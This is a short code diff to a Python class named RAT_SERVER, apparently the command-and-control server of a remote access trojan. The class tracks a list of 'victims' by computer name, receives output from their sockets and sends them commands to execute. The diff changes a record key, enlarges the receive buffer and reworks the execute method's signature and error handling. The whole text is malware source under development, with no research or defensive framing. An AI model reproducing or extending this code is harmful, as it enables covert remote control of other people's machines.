@@ -48,10 +48,10 @@ class RAT_SERVER(metaclass=SingletonMeta):
                 output_dict[item[0]] = item[1]
 
             print(
-                f"[*] Adding {output_dict['Name of Computer']} to the list of victims")
+                f"[*] Adding {output_dict['Name']} to the list of victims")
 
             for victim in self.victims:
-                if victim["Name of Computer"] == output_dict["Name of Computer"]:
+                if victim["Name"] == output_dict["Name"]:
                     self.victims.remove(victim)
             self.victims.append(output_dict)
 
@@ -62,7 +62,7 @@ class RAT_SERVER(metaclass=SingletonMeta):
             ready = select.select([client_socket], [], [], 5)
 
             if ready[0]:
-                return client_socket.recv(1024).decode()
+                return client_socket.recv(100024).decode()
             else:
                 return "Error receiving output"
         except Exception as e:
@@ -83,10 +83,11 @@ class RAT_SERVER(metaclass=SingletonMeta):
 
         client_socket.close()
 
-    def execute(self, command, client_socket):
+    def execute(self, command_type, command, client_socket):
         # Execute the command
         try:
-            execute_command(self, command, client_socket)
+            execute_command(self, command_type, command, client_socket)
         except Exception as e:
             output = str(e)
-            client_socket.send(output.encode())
+            print(f"Error executing command: {output}")
+            return output
